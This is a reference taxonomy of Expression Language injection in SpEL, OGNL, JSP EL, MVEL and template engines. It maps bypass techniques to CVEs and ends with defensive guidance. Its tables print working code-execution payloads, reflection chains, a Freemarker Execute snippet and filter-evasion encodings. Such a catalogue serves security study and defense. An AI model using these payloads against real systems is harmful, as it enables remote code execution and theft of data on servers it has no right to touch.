# Expression Language Injection Mutation/Variation Taxonomy

---

## Classification Structure

Expression Language (EL) Injection occurs when user-controlled data flows into an expression interpreter without adequate sanitization, enabling attackers to manipulate the intended execution flow. This taxonomy organizes EL injection mutations across three orthogonal axes:

**Axis 1: Injection Vector** — The structural component or language feature being exploited (§1-§8)
**Axis 2: Bypass Mechanism** — The defensive evasion technique employed
**Axis 3: Attack Impact** — The exploitation outcome and security consequence

This taxonomy covers all major expression languages used in enterprise applications: Spring Expression Language (SpEL), JSP Expression Language (EL/JSTL), Object-Graph Navigation Language (OGNL), MVFLEX Expression Language (MVEL), and template engines (Thymeleaf, Freemarker, Velocity).

### Core Bypass Mechanisms (Axis 2)

Expression language injection attacks employ six fundamental bypass mechanisms that cut across all injection vectors:

| Bypass Type | Mechanism | Applicability |
|------------|-----------|---------------|
| **Sandbox Escape** | Circumventing security manager, restricted method access, or expression evaluation contexts | All languages with sandboxing |
| **Filter/WAF Bypass** | Evading pattern-based detection through encoding, obfuscation, or alternate syntax | Universal |
| **Context Escape** | Breaking out of intended expression scope into broader execution contexts | Template engines, Spring tags |
| **Parser Differential** | Exploiting discrepancies between validators and interpreters | Multi-component systems |
| **Double Evaluation** | Triggering multiple expression resolution passes | Spring pre-3.0.6, OGNL |
| **Type Confusion** | Abusing implicit type conversion or casting mechanisms | Statically-typed languages (Java) |

---

## §1. Expression Syntax Manipulation

Exploiting variations in delimiter interpretation, expression nesting, and evaluation timing to inject malicious expressions.

### §1-1. Delimiter Variation

Different expression languages use distinct delimiters, and frameworks may support multiple syntaxes simultaneously.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Immediate Evaluation (`${}`)** | JSP/JSTL immediate syntax evaluated during page rendering | Used in JSP, Spring, JSTL |
| **Deferred Evaluation (`#{}`)** | JSF/Spring deferred syntax evaluated by framework lifecycle | Used in JSF, Spring WebFlow |
| **Thymeleaf Inline (`[[...]]`)** | Thymeleaf text inlining escapes HTML by default but evaluates expressions | Thymeleaf 3.x+ |
| **Velocity Reference (`$var`)** | Velocity template variables without method invocation | Velocity templates |
| **Freemarker Interpolation (`${...}`)** | Freemarker expression syntax with built-in functions | Freemarker templates |

**Example**: `${7*7}` vs `#{7*7}` — both evaluate to `49` but trigger at different framework lifecycle phases.

### §1-2. Nested Expression Injection

Injecting expressions within strings that undergo multiple resolution passes.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Double Resolution** | Expression embedded in string that itself gets evaluated as expression | Spring <3.0.6, certain OGNL contexts |
| **Template-in-Template** | Expression injected into template variable that's later rendered | Nested template rendering |
| **Constraint Violation Message** | Expression injected into validation error message templates | Spring Validation with user input in messages |

**CVE-2022-22963 Exploitation**: Spring Cloud Function evaluated HTTP headers as SpEL expressions. Payload: `T(java.lang.Runtime).getRuntime().exec("whoami")` injected via `spring.cloud.function.routing-expression` header.

### §1-3. Polyglot Injection

Single payload valid across multiple expression languages for fingerprinting or universal exploitation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Mathematical Polyglot** | `{{7*7}}${7*7}<%= 7*7 %>#{7*7}` triggers different responses per engine | Engine fingerprinting |
| **String Manipulation Polyglot** | `${'zkz'.toString().replace('k','x')}` works across JSP EL, SpEL, OGNL | Cross-language RCE detection |
| **Universal Detection Probe** | Payloads interpreted by 40+ template engines (Hackmanit table) | Comprehensive vulnerability scanning |

---

## §2. Language Feature Exploitation

Leveraging built-in expression language capabilities like method invocation, property access, and operators.

### §2-1. Method Invocation

EL 2.2+ specification allows direct method calls on objects, enabling arbitrary code execution.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Direct Runtime Execution** | `T(java.lang.Runtime).getRuntime().exec('cmd')` (SpEL syntax) | SpEL, full method access |
| **ProcessBuilder Invocation** | `new java.lang.ProcessBuilder(['cmd','/c','whoami']).start()` | Java-based EL with constructor access |
| **ScriptEngineManager Execution** | `Class.forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('...')` | JavaScript engine available |
| **Static Method Access** | `T(java.lang.System).getProperty('user.dir')` | SpEL T() operator for static class reference |

**Example**: JSP EL `${pageContext.request.getSession().setAttribute("admin",true)}` manipulates session state.

### §2-2. Property Access Chain

Traversing object graphs to reach dangerous methods or sensitive data.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Implicit Object Access** | `${pageContext}`, `${applicationScope}`, `${sessionScope}` expose internal state | JSP EL <2.2 |
| **Class Navigation** | `${''.getClass().forName('java.lang.Runtime')}` accesses arbitrary classes | Reflection available |
| **Bean Traversal** | `@myBean.dangerousMethod()` accesses Spring-managed beans | SpEL with bean access |
| **Nested Property Chains** | `${user.account.permissions.admin}` — long chains to reach restricted properties | Complex object models |

### §2-3. Operator and Built-in Function Abuse

Leveraging language-specific operators and functions for information disclosure or execution.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Ternary Conditional Exploitation** | `${condition ? exec('cmd') : ''}` hides execution in conditional | Conditional operators supported |
| **Elvis Operator Chaining** | `${var ?: exec('fallback')}` triggers execution on null values | Groovy-style operators (SpEL) |
| **String Functions** | `concat()`, `substring()`, `replace()` for data exfiltration | All EL implementations |
| **Collection Operators** | OGNL projection/selection operators `collection.{? #this.condition}` | OGNL-specific |

---

## §3. Type System Abuse (Reflection & Class Loading)

Exploiting Java's reflection API and dynamic class loading to bypass restrictions and achieve execution.

### §3-1. Reflection-Based Execution

Using reflection to access restricted methods or circumvent sandboxing.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **getClass() Chain** | `${''.getClass().forName('java.lang.Runtime').getMethods()[x]}` | Reflection not blocked |
| **getDeclaredMethod Invocation** | `.getDeclaredMethod('getRuntime').invoke(null)` bypasses visibility | Private method access needed |
| **Field Manipulation** | `.getDeclaredField('field').setAccessible(true).set()` modifies protected fields | Field-level access |
| **Constructor Access** | `.getDeclaredConstructor().newInstance()` instantiates arbitrary classes | Unrestricted instantiation |

**CVE-2024-51466 Payload**: IBM Cognos exploitation via `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('command')}`

### §3-2. ClassLoader Manipulation

Bypassing OGNL 3.x+ restrictions that block `ClassLoader.loadClass()`.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Thread ClassLoader Access** | `Thread.currentThread().getContextClassLoader().loadClass()` | Indirect ClassLoader reference |
| **forName() Alternative** | `Class.forName('ClassName')` instead of `ClassLoader.loadClass()` | Bypasses OGNL restrictions (CVE-2023-22527) |
| **URLClassLoader Remote Loading** | Load malicious classes from attacker-controlled URLs | Network access available |

**Confluence CVE-2023-22527 Bypass**: Used `Class.forName()` via Java reflection API instead of restricted `ClassLoader.loadClass()`.

### §3-3. Type Conversion Exploitation

Abusing implicit type casting and conversion mechanisms.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **String-to-Class Coercion** | Frameworks auto-convert strings to Class objects | Spring parameter binding |
| **Primitive Wrapper Confusion** | `Integer.TYPE` vs `Integer.class` differences | Type system edge cases |
| **Array Type Casting** | Casting to `Object[]` to access protected arrays | Type safety bypasses |

---

## §4. Encoding & Obfuscation Techniques

Evading character filters, WAFs, and blacklists through alternative representations.

### §4-1. Character Construction

Building strings without literal quotes by constructing characters programmatically.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ASCII Code Point Conversion** | `true.toString().charAt(0).toChars(67)[0].toString()` produces `'C'` | Bypasses quote blacklists |
| **Concatenation Chains** | `.concat()` methods to build strings from individual characters | Quote filtering in place |
| **Boolean String Extraction** | `true.toString().charAt(0)` yields `'t'`, `false.toString()` yields `'f'` | No string literals allowed |

**Pulse Security WAF Bypass**: Constructed `"java.lang.Runtime"` as 16-character chain via ASCII codes to bypass quote filters and achieve RCE without strings.

### §4-2. Unicode and Hex Encoding

Representing characters using escape sequences.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Hex Escapes** | `\x61` represents `'a'` | Language supports hex escapes |
| **Unicode Escapes** | `\u003a` represents `':'` | Java string literals |
| **Octal Escapes** | `\141` represents `'a'` | Legacy encoding support |
| **Mixed Encoding** | Combining URL, Unicode, hex to evade multi-format decoders | Bypasses modern WAFs |

**Thymeleaf attr Filter Bypass**: Replacing underscores with hex `\x5f` which renders as `_` during template processing.

### §4-3. Special Character Substitution

Replacing filtered characters with functional equivalents.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **$IFS for Spaces** | Bash internal field separator replaces space in command arguments | Linux command execution contexts |
| **Bracket Notation** | `object['property']` instead of `object.property` bypasses dot filters | Jinja2, JavaScript-style syntax |
| **attr Filter Substitution** | Jinja2 `{{''|attr('__class__')}}` instead of `{{''.__class__}}` | Dot character blocked |
| **format Function Injection** | `{{"%s"|format("value")}}` concatenates without explicit operators | String concatenation blocked |

---

## §5. Context Boundary Manipulation

Escaping intended expression scopes to inject into broader execution contexts.

### §5-1. Template Context Escape

Breaking out of data contexts into code contexts within template engines.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Spring Tag Double Resolution** | Spring <3.0.6 evaluates JSP tags twice: `?msg=${param.test}&test=${payload}` | Legacy Spring versions |
| **Message Tag Injection** | `<spring:message code="${param.msg}"/>` evaluates user input | Spring message tags |
| **Eval Tag Direct Execution** | `<spring:eval expression="${param.vuln}"/>` explicitly evaluates expressions | Spring eval tags in JSP |

**Spring Double Resolution**: Setting `springJspExpressionSupport=false` in web.xml disables vulnerable behavior.

### §5-2. Error Message Injection

Injecting expressions into error handling and logging contexts.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Constraint Violation Template** | `context.buildConstraintViolationWithTemplate(userInput)` in Bean Validation | Spring Validation without sanitization |
| **Exception Message Interpolation** | Error messages containing `${...}` get evaluated | Logging frameworks with EL support |
| **Struts Exception Handling** | Content-Type header OGNL injection triggers in error handler (CVE-2017-5638) | Jakarta Multipart parser errors |

**CVE-2017-5638 (Equifax Breach)**: Malformed Content-Type header `%{(#cmd='whoami')(...)}` executed during exception message building.

### §5-3. HTTP Header and Parameter Injection

Injecting expressions via HTTP metadata that gets evaluated by frameworks.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Routing Expression Header** | `spring.cloud.function.routing-expression: T(Runtime).exec()` | Spring Cloud Function |
| **Content-Type OGNL** | Malicious OGNL in Content-Type header during multipart parsing | Apache Struts vulnerable versions |
| **Accept-Language Exploitation** | Language selection parameters evaluated as expressions | i18n frameworks with EL |

**CVE-2022-22963**: Spring Cloud Function routed requests based on SpEL expression in HTTP header, enabling RCE.

---

## §6. Implicit Object & Scope Access

Accessing framework-provided implicit objects and scopes to disclose information or escalate privileges.

### §6-1. JSP Implicit Objects

Standard JSP objects exposed to EL expressions (pre-EL 2.2).

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **pageContext Exposure** | `${pageContext.request.getSession()}` accesses session | JSP environment |
| **Session Scope Access** | `${sessionScope.user.password}` reads session attributes | Sensitive data in session |
| **Application Scope Access** | `${applicationScope.config}` exposes application-wide configuration | Secrets in application scope |
| **Request Parameter Injection** | `${param.admin}` reads query parameters, `${paramValues}` for arrays | User-controlled parameters |

**Information Disclosure**: PayPal internal information leak via implicit object traversal in EL context.

### §6-2. Spring-Specific Scopes

Additional scopes and beans exposed in Spring Framework.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Bean Access** | `@beanName` or `@myService.method()` calls Spring beans | SpEL with bean resolution |
| **Environment Property Access** | `@environment.getProperty('secret.key')` reads configuration | Spring environment accessible |
| **WebFlow Scope Pollution** | Accessing flow and conversation scopes in Spring WebFlow | WebFlow-specific scopes |

**CVE-2025-41253**: Spring Cloud Gateway leaked environment variables via SpEL injection when actuator endpoints misconfigured.

### §6-3. OGNL Context Variables

OGNL-specific context objects and value stack manipulation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **#_memberAccess Overwrite** | Overwriting security object to bypass sandbox (CVE-2020-17530) | OGNL without proper sandboxing |
| **Value Stack Access** | `#context['valueStack']` accesses Struts action context | Apache Struts framework |
| **OgnlContext Manipulation** | Direct manipulation of OGNL evaluation context | Deep OGNL integration |

---

## §7. Gadget Chain Construction

Chaining multiple techniques or leveraging existing "gadget" methods to achieve complex exploitation.

### §7-1. Early Response Gadgets

Methods that respond before consuming full request body, useful in specific attack scenarios.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Static File Handlers** | Static resource endpoints return before reading body | Web servers with static handlers |
| **Windows Reserved Filenames** | Requests to `CON`, `PRN`, `AUX` trigger early responses | Windows-based servers |
| **Server Redirects** | 30x redirects issued before body consumption | Redirect logic before body parsing |
| **Expect: 100-continue** | Client waits for 100 response before sending body | HTTP/1.1 continuation mechanism |

**Note**: These gadgets are often combined with HTTP request smuggling for advanced attacks, outside core EL injection scope.

### §7-2. Deserialization Gadget Chains

Using expression language to trigger Java deserialization gadgets (crossover vulnerability class).

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **ysoserial Integration** | Invoking deserialization gadgets via EL reflection | Commons Collections, Spring, etc. on classpath |
| **Remote Gadget Loading** | Loading gadget classes from attacker URL via URLClassLoader | Network egress allowed |

---

## §8. Framework-Specific Mutations

Unique features and vulnerabilities in specific expression language implementations.

### §8-1. Spring SpEL Specifics

Spring Expression Language unique features.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **T() Operator** | `T(java.lang.System)` references static classes | SpEL-specific syntax |
| **@Value Annotation Injection** | `@Value("${user.input}")` evaluates as SpEL if malformed | Spring configuration injection |
| **@Query SpEL Expressions** | Spring Data JPA `@Query` with SpEL `#{#entityName}` | Dynamic query construction |
| **SimpleEvaluationContext Bypass** | Exploiting ReDoS even in restricted context | SpEL sandbox limitations |

### §8-2. OGNL (Struts/Confluence) Specifics

OGNL projection, selection, and double evaluation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Projection Operator** | `collection.{property}` extracts properties | OGNL collection operations |
| **Selection Operator** | `collection.{? #this.condition}` filters collections | OGNL lambda expressions |
| **Double OGNL Evaluation** | CVE-2020-17530 evaluated expressions twice | Struts vulnerable versions |
| **Namespace Redirect Injection** | `action:` namespace with OGNL injection | Struts namespace handling |

### §8-3. MVEL Specifics

MVFLEX Expression Language features (Apache Unomi).

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Inline Collections** | `['item1','item2']` syntax for list construction | MVEL-specific syntax |
| **Property Navigation** | Nested property access with automatic null-safe navigation | MVEL convenience features |
| **Script Import** | `import java.lang.Runtime; Runtime.exec()` | MVEL script evaluation mode |

**CVE-2020-13942**: Apache Unomi MVEL RCE via unsanitized expression evaluation in profile conditions.

### §8-4. Template Engine Specifics

Freemarker, Velocity, Thymeleaf unique exploitation.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Freemarker Execute** | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("whoami")}` | Freemarker built-ins |
| **Velocity ClassTool** | `#set($class=$class.forName('Runtime'))` | Velocity with ClassTool enabled |
| **Thymeleaf Preprocessing** | `__${expression}__` preprocessed before main evaluation | Thymeleaf 3.x preprocessing |
| **Jinja2 attr/format Filters** | `{{''|attr('__class__')}}` bypasses dot filters | Python Jinja2 (included for comparison) |

---

## Attack Impact Mapping (Axis 3)

| Impact Scenario | Mechanism | Primary Mutation Categories |
|-----------------|-----------|---------------------------|
| **Information Disclosure** | Accessing implicit objects, environment variables, configuration | §6 + §2-2 |
| **Remote Code Execution (RCE)** | Method invocation, reflection, ProcessBuilder | §2-1 + §3-1 + §5-3 |
| **Sandbox Escape** | Reflection-based bypass of security managers and restricted contexts | §3-1 + §3-2 + §8-1 |
| **Authentication/Authorization Bypass** | Session manipulation, role attribute modification | §2-2 + §6-1 |
| **Configuration Manipulation** | Modifying application-scoped variables and Spring beans | §6-2 + §2-2 |
| **Denial of Service (DoS)** | Resource exhaustion via ReDoS or infinite loops | §2-3 + §8-1 |
| **Data Exfiltration** | Extracting sensitive data through error messages or HTTP channels | §5-2 + §6 |

---

## CVE / Bounty Mapping (2016-2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §5-3 + §2-1 | CVE-2025-41253 (Spring Cloud Gateway) | HIGH. Environment variable exposure via SpEL in actuator routes |
| §5-2 + §3-1 | CVE-2024-51466 (IBM Cognos) | CRITICAL. RCE via reflection-based EL injection in validation messages |
| §3-2 + §8-2 | CVE-2023-22527 (Confluence) | CVSS 10.0 CRITICAL. Unauthenticated OGNL RCE via Class.forName() bypass |
| §5-3 + §2-1 | CVE-2022-22963 (Spring Cloud Function) | CRITICAL. SpEL RCE via routing-expression header, exploited in wild |
| §1-2 + §2-1 | CVE-2022-22980 (Spring Data MongoDB) | HIGH. SpEL injection in query derivation |
| §5-2 + §6-3 + §8-2 | CVE-2022-26134 (Confluence) | CRITICAL. OGNL injection in error handling |
| §5-2 + §6-3 | CVE-2021-26084 (Confluence) | CRITICAL. OGNL injection via WebWork |
| §8-2 | CVE-2020-17530 (Struts) | CRITICAL. Double OGNL evaluation via #_memberAccess manipulation |
| §8-3 | CVE-2020-13942 (Apache Unomi) | CRITICAL. MVEL RCE in profile condition evaluation |
| §5-3 + §8-2 | CVE-2017-5638 (Struts/Equifax) | CRITICAL. $50M+ data breach. OGNL injection via Content-Type header |
| §4-1 + WAF bypass | Pulse Security Case Study | N/A. WAF bypass via ASCII character construction achieving RCE |
| §6-1 | PayPal Disclosure (Medium writeup) | Bug bounty. Internal information disclosure via implicit object access |

---

## Detection Tools Matrix

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **SSTImap** (Offensive) | Comprehensive SSTI/EL detection & exploitation | Polyglot injection, automated RCE payload generation |
| **Tplmap** (Offensive) | Legacy SSTI scanner for multiple template engines | Fingerprinting + file system access testing |
| **BountyIt** (Offensive) | Multi-vulnerability fuzzer (SSTI, XSS, LFI, RCE) | Content-length delta detection + signature verification |
| **PayloadsAllTheThings** (Reference) | Community payload repository | Curated payload collection by language/framework |
| **Hackmanit Template Injection Table** (Reference) | Interactive polyglot response table for 44 engines | Systematic engine fingerprinting via polyglots |
| **Burp Extensions** (Offensive) | Various SSTI detection plugins | Passive & active scanning with Collaborator |
| **Semgrep Rules** (Defensive) | Static analysis for vulnerable EL patterns | Code-level detection of unsafe expression evaluation |
| **HTTP-Normalizer** (Defensive) | RFC-compliant HTTP parsing to eliminate discrepancies | Parser differential prevention |
| **Spring Security Hardening** (Defensive) | Disables double resolution, restricts bean access | Framework-level sandboxing |

---

## Summary: Core Principles

### The Fundamental Vulnerability

Expression Language Injection exists because of a **fundamental tension in EL design**: these languages must be powerful enough for developers to access application state and invoke methods, yet safe enough to handle user input. The core issue is **insufficient separation of code and data contexts**. When user-controlled strings flow into expression interpreters without strict type enforcement or context isolation, arbitrary code execution becomes possible.

This vulnerability class persists across decades because:

1. **Implicit Trust**: Frameworks implicitly trust expression inputs, assuming developers will never pass user data directly to interpreters
2. **Feature Richness**: EL 2.2+ method invocation, reflection APIs, and type operators enable Turing-complete computation
3. **Context Proliferation**: Expressions appear in diverse contexts (templates, annotations, validation messages, headers) making comprehensive filtering impractical
4. **Layered Evaluation**: Double resolution, preprocessing, and multi-stage evaluation create blind spots for validators

### Why Incremental Patches Fail

Blacklists and character filters are systematically defeated by:
- **Encoding diversity**: Unicode, hex, octal, ASCII construction bypass signature detection
- **Syntax flexibility**: Multiple equivalent representations (bracket vs dot notation, T() vs Class.forName())
- **Gadget availability**: Reflection and ClassLoader APIs provide universal RCE primitives regardless of blocked methods
- **Parser differentials**: Validators and interpreters parse expressions differently, enabling smuggling

Historical CVEs demonstrate this pattern: CVE-2017-5638 (Struts) was followed by CVE-2017-9791, CVE-2019-0230, CVE-2020-17530 — each bypassing previous mitigations through new injection contexts or encoding techniques.

### Structural Solution

The only reliable defense is **architectural isolation**:

1. **Never evaluate user input as expressions**: Use parameterized queries, allow-listed values, and type-safe data binding instead of string-based expression evaluation
2. **Context-aware output encoding**: If expressions are unavoidable, use frameworks with safe evaluation contexts (Spring's `SimpleEvaluationContext`) and properly escape user data before injection
3. **Principle of least privilege**: Disable reflection, class loading, and static method access in expression contexts unless explicitly required
4. **Input validation at boundaries**: Validate data type and structure at system entry points before it reaches any expression layer
5. **Defense in depth**: Combine framework-level sandboxing (disabled double resolution, restricted bean access) with runtime protections (security manager, network egress controls)

**Gold Standard**: Spring Framework's move from permissive `StandardEvaluationContext` to restrictive `SimpleEvaluationContext`, though even this is bypassed by ReDoS — demonstrating that true security requires eliminating user input from expression evaluation entirely.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

### CVE Advisories
- [Spring Cloud Gateway CVE-2025-41253](https://securityonline.info/spring-patches-two-flaws-spel-injection-cve-2025-41253-leaks-secrets-stomp-csrf-bypasses-websocket-security/)
- [Confluence CVE-2023-22527 OGNL Injection](https://www.picussecurity.com/resource/blog/cve-2023-22527-another-ognl-injection-leads-to-rce-in-atlassian-confluence)
- [Spring Cloud Function CVE-2022-22963](https://www.akamai.com/blog/security/spring-cloud-function)
- [Apache Struts CVE-2017-5638 (Equifax Breach)](https://www.blackduck.com/blog/cve-2017-5638-apache-struts-vulnerability-explained.html)
- [Apache Struts CVE-2020-17530](https://blog.qualys.com/vulnerabilities-threat-research/2021/09/21/apache-struts-2-double-ognl-evaluation-vulnerability-cve-2020-17530)
- [Apache Unomi CVE-2020-13942 MVEL RCE](https://www.invicti.com/web-application-vulnerabilities/apache-unomi-mvel-rce-cve-2020-13942)

### Technical Papers and Presentations
- [Expression Language Injection - Minded Security (Stefano Di Paola)](https://mindedsecurity.com/wp-content/uploads/2020/10/ExpressionLanguageInjection.pdf)
- [Server-Side Template Injection: RCE for the Modern Web App - BlackHat 2015](https://blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
- [Remote Code Execution with EL Injection Vulnerabilities - Exploit-DB](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)

### Practitioner Resources
- [OWASP Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [PortSwigger Expression Language Injection](https://portswigger.net/kb/issues/00100f20_expression-language-injection)
- [PayloadsAllTheThings - Server Side Template Injection (Java)](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Java/)
- [EL Injection WAF Bypass - No Strings Attached - Pulse Security](https://pulsesecurity.co.nz/articles/EL-Injection-WAF-Bypass)
- [Leveraging SpEL Injection for RCE](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
- [Hackmanit Template Injection Vulnerabilities](https://hackmanit.de/en/blog-en/178-template-injection-vulnerabilities-understand-detect-identify/)

### Tools
- [SSTImap - Automatic SSTI Detection Tool](https://github.com/vladko312/SSTImap)
- [Tplmap - Server-Side Template Injection Detection and Exploitation](https://github.com/epinna/tplmap)
- [PayloadsAllTheThings GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

### Recent Research and Blog Posts
- [Jinja2 Template Injection Filter Bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [Obfuscating Attacks Using Encodings - PortSwigger](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings)
- [Template Injection Workshop - GoSecure](https://gosecure.github.io/template-injection-workshop/)
- [InstaTunnel - Expression Language Injection: When ${} Leads to Remote](https://instatunnel.my/blog/expression-language-injection-when-becomes-your-worst-nightmare)
